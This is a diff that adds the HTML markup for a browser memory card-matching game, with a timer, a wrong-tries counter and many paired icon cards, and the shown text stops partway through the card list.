@@ -1,0 +1,1481 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <link rel="stylesheet" href="bootstrap-icons.css" />
+    <link rel="stylesheet" href="css/all.min.css" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/memory game.css" />
+    <link rel="stylesheet" href="css/update.css" />
+    <title>memory game</title>
+  </head>
+  <body>
+    <div class="control-btn">
+      <span class="btn btn-danger">start game</span>
+      <span class="btn btn-primary show_game">show game</span>
+    </div>
+    <div class="info-cont container">
+      <div class="name1">Hello: <span>unknown</span></div>
+      <div class="timer">time: <span>1</span>:<span>00</span></div>
+      <div class="tries">wrongs: <span>0</span></div>
+    </div>
+    <div class="memory-game-blocks container">
+      <div class="game-block" data-data="angular">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f81242" class="face back">
+          <i class="fab fa-angular fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="angular">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f81242" class="face back">
+          <i class="fab fa-angular fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="earlybirds">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f88112" class="face back">
+          <i class="fab fa-earlybirds fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="earlybirds">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f88112" class="face back">
+          <i class="fab fa-earlybirds fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="envira">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00a800" class="face back">
+          <i class="fab fa-envira fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="envira">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00a800" class="face back">
+          <i class="fab fa-envira fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="ethereum">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #df1200" class="face back">
+          <i class="fab fa-ethereum fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="ethereum">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #df1200" class="face back">
+          <i class="fab fa-ethereum fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="evernote">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #c42eff" class="face back">
+          <i class="fab fa-evernote fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="evernote">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #c42eff" class="face back">
+          <i class="fab fa-evernote fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="react">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #578cff" class="face back">
+          <i class="fab fa-react fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="react">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #578cff" class="face back">
+          <i class="fab fa-react fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="sketch">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #008cffee" class="face back">
+          <i class="fab fa-sketch fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="sketch">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #008cffee" class="face back">
+          <i class="fab fa-sketch fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="snapchat">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f1f910" class="face back">
+          <i class="fab fa-snapchat fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="snapchat">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f1f910" class="face back">
+          <i class="fab fa-snapchat fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="spotify">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00e222" class="face back">
+          <i class="fab fa-spotify fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="spotify">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00e222" class="face back">
+          <i class="fab fa-spotify fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="themeisle">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f0f600" class="face back">
+          <i class="fab fa-themeisle fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="themeisle">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f0f600" class="face back">
+          <i class="fab fa-themeisle fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="wolf-pack-battalion">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #5700e4" class="face back">
+          <i class="fab fa-wolf-pack-battalion fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="wolf-pack-battalion">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #5700e4" class="face back">
+          <i class="fab fa-wolf-pack-battalion fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="vuejs">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #12d300" class="face back">
+          <i class="fab fa-vuejs fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="vuejs">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #12d300" class="face back">
+          <i class="fab fa-vuejs fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="discord">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #12dcdf" class="face back">
+          <i class="fab fa-discord fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="discord">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #12dcdf" class="face back">
+          <i class="fab fa-discord fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="android">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #2cff5a" class="face back">
+          <i class="fab fa-android fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="android">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #2cff5a" class="face back">
+          <i class="fab fa-android fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="app-store">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #1298de" class="face back">
+          <i class="fab fa-app-store fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="app-store">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #1298de" class="face back">
+          <i class="fab fa-app-store fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bootstrap">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #a825ff" class="face back">
+          <i class="fab fa-bootstrap fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bootstrap">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #a825ff" class="face back">
+          <i class="fab fa-bootstrap fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="canadian-maple-leaf">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f94812" class="face back">
+          <i class="fab fa-canadian-maple-leaf fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="canadian-maple-leaf">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f94812" class="face back">
+          <i class="fab fa-canadian-maple-leaf fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="d-and-d">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff2f14" class="face back">
+          <i class="fab fa-d-and-d fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="d-and-d">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff2f14" class="face back">
+          <i class="fab fa-d-and-d fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="github">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00012a" class="face back">
+          <i class="fab fa-github fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="github">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00012a" class="face back">
+          <i class="fab fa-github fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="lemon">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #bbff00" class="face back">
+          <i class="fad fa-lemon fa-swap-opacity fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="lemon">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #bbff00" class="face back">
+          <i class="fad fa-lemon fa-swap-opacity fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="moon">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffc00d" class="face back">
+          <i class="fa fa-moon fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="moon">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffc00d" class="face back">
+          <i class="fa fa-moon fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="snowflake">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00a6f3" class="face back">
+          <i class="fad fa-snowflake fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="snowflake">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00a6f3" class="face back">
+          <i class="fad fa-snowflake fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="anchor">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #181846" class="face back">
+          <i class="fad fa-anchor fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="anchor">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #181846" class="face back">
+          <i class="fad fa-anchor fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="apple">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fe1546" class="face back">
+          <i class="fab fa-apple fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="apple">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fe1546" class="face back">
+          <i class="fab fa-apple fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="baseball-bat-ball">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffff00" class="face back">
+          <i class="fad fa-baseball-bat-ball fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="baseball-bat-ball">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffff00" class="face back">
+          <i class="fad fa-baseball-bat-ball fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="basketball">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f16c00" class="face back">
+          <i class="fad fa-basketball fa-swap-opacity fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="basketball">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f16c00" class="face back">
+          <i class="fad fa-basketball fa-swap-opacity fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bell">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffc107" class="face back">
+          <i class="fad fa-swap-opacity fa-bell fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bell">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffc107" class="face back">
+          <i class="fad fa-swap-opacity fa-bell fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="biohazard">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff3523" class="face back">
+          <i class="fad fa-biohazard fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="biohazard">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff3523" class="face back">
+          <i class="fad fa-biohazard fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bolt">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #116ef9" class="face back">
+          <i class="fas fa-bolt fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bolt">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #116ef9" class="face back">
+          <i class="fas fa-bolt fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bomb">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #1a1a1a" class="face back">
+          <i class="fad fa-bomb fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bomb">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #1a1a1a" class="face back">
+          <i class="fad fa-bomb fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bone">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #d9d9d9" class="face back">
+          <i class="fas fa-bone fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bone">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #d9d9d9" class="face back">
+          <i class="fas fa-bone fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bowling-ball">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #247cff" class="face back">
+          <i class="fad fa-bowling-ball fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bowling-ball">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #247cff" class="face back">
+          <i class="fad fa-bowling-ball fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bread-slice">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff8e24" class="face back">
+          <i class="fad fa-swap-opacity fa-bread-slice fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bread-slice">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff8e24" class="face back">
+          <i class="fad fa-swap-opacity fa-bread-slice fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bus">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffff00" class="face back">
+          <i class="fas fa-bus fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bus">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffff00" class="face back">
+          <i class="fas fa-bus fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="cake-candles">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff00b3" class="face back">
+          <i class="fad fa-cake-candles fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="cake-candles">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff00b3" class="face back">
+          <i class="fad fa-cake-candles fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="candy-cane">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff2d5b" class="face back">
+          <i class="fad fa-swap-opacity fa-candy-cane fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="candy-cane">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff2d5b" class="face back">
+          <i class="fad fa-swap-opacity fa-candy-cane fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="carrot">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff5917" class="face back">
+          <i class="fad fa-swap-opacity fa-carrot fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="carrot">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff5917" class="face back">
+          <i class="fad fa-swap-opacity fa-carrot fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="cat">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #111122" class="face back">
+          <i class="fad fa-swap-opacity fa-cat fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="cat">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #111122" class="face back">
+          <i class="fad fa-swap-opacity fa-cat fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="clover">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00f900" class="face back">
+          <i class="fas fa-clover fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="clover">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00f900" class="face back">
+          <i class="fas fa-clover fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="crow">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #111533" class="face back">
+          <i class="fad fa-crow fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="crow">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #111533" class="face back">
+          <i class="fad fa-crow fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="disease">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff589e" class="face back">
+          <i class="fad fa-swap-opacity fa-disease fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="disease">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff589e" class="face back">
+          <i class="fad fa-swap-opacity fa-disease fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="dog">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #975100" class="face back">
+          <i class="fad fa-dog fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="dog">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #975100" class="face back">
+          <i class="fad fa-dog fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="dove">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #45f445" class="face back">
+          <i class="fad fa-swap-opacity fa-dove fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="dove">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #45f445" class="face back">
+          <i class="fad fa-swap-opacity fa-dove fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="dragon">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f93512" class="face back">
+          <i class="fad fa-dragon fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="dragon">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f93512" class="face back">
+          <i class="fad fa-dragon fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="droplet">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #2659ff" class="face back">
+          <i class="fad fa-swap-opacity fa-droplet fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="droplet">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #2659ff" class="face back">
+          <i class="fad fa-swap-opacity fa-droplet fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="flask">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #1c7eff" class="face back">
+          <i class="fad fa-flask fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="flask">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #1c7eff" class="face back">
+          <i class="fad fa-flask fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="meteor">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f84245" class="face back">
+          <i class="fad fa-swap-opacity fa-meteor fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="meteor">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f84245" class="face back">
+          <i class="fad fa-swap-opacity fa-meteor fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="music">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #c114f5" class="face back">
+          <i class="fad fa-music fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="music">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #c114f5" class="face back">
+          <i class="fad fa-music fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="palette">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff3e9e" class="face back">
+          <i class="fad fa-swap-opacity fa-palette fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="palette">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff3e9e" class="face back">
+          <i class="fad fa-swap-opacity fa-palette fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="mug-hot">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #754200" class="face back">
+          <i class="fad fa-mug-hot fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="mug-hot">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #6d3e00" class="face back">
+          <i class="fad fa-mug-hot fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="masks-theater">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff9800" class="face back">
+          <i class="fad fa-masks-theater fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="masks-theater">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff9800" class="face back">
+          <i class="fad fa-masks-theater fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="feather">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #effe00" class="face back">
+          <i class="fad fa-swap-opacity fa-feather-pointed fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="feather">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #effe00" class="face back">
+          <i class="fad fa-swap-opacity fa-feather-pointed fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="radiation">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #23ae23" class="face back">
+          <i class="fad fa-radiation fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="radiation">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #23ae23" class="face back">
+          <i class="fad fa-radiation fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="acorn">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #e09136" class="face back">
+          <i class="fad fa-acorn fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="acorn">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #e09136" class="face back">
+          <i class="fad fa-acorn fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="alicorn">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #36e0c4" class="face back">
+          <i class="fad fa-alicorn fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="alicorn">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #36e0c4" class="face back">
+          <i class="fad fa-alicorn fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="alien">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #36e05b" class="face back">
+          <i class="fad fa-alien fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="alien">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #36e05b" class="face back">
+          <i class="fad fa-alien fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="avocado">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00b126" class="face back">
+          <i class="fad fa-swap-opacity fa-avocado fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="avocado">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00b126" class="face back">
+          <i class="fad fa-swap-opacity fa-avocado fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="badger-honey">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f0b000" class="face back">
+          <i class="fad fa-badger-honey fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="badger-honey">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f0b000" class="face back">
+          <i class="fad fa-badger-honey fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bat">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #0b192e" class="face back">
+          <i class="fad fa-bat fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bat">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #0b192e" class="face back">
+          <i class="fad fa-bat fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bee">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fbff00" class="face back">
+          <i class="fad fa-bee fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bee">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fbff00" class="face back">
+          <i class="fad fa-bee fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="book">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00a2ff" class="face back">
+          <i class="fad fa-book fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="book">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #00a2ff" class="face back">
+          <i class="fad fa-book fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="boombox">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff9900" class="face back">
+          <i class="fad fa-boombox fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="boombox">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff9900" class="face back">
+          <i class="fad fa-boombox fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bowl-food">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fffab5" class="face back">
+          <i class="fad fa-bowl-food fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="bowl-food">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fffab5" class="face back">
+          <i class="fad fa-bowl-food fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="broccoli">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #75f100" class="face back">
+          <i class="fad fa-broccoli fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="broccoli">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #75f100" class="face back">
+          <i class="fad fa-broccoli fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="burrito">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #976700" class="face back">
+          <i class="fad fa-burrito fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="burrito">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #976700" class="face back">
+          <i class="fad fa-burrito fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="butter">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffef13" class="face back">
+          <i class="fad fa-butter fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="butter">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
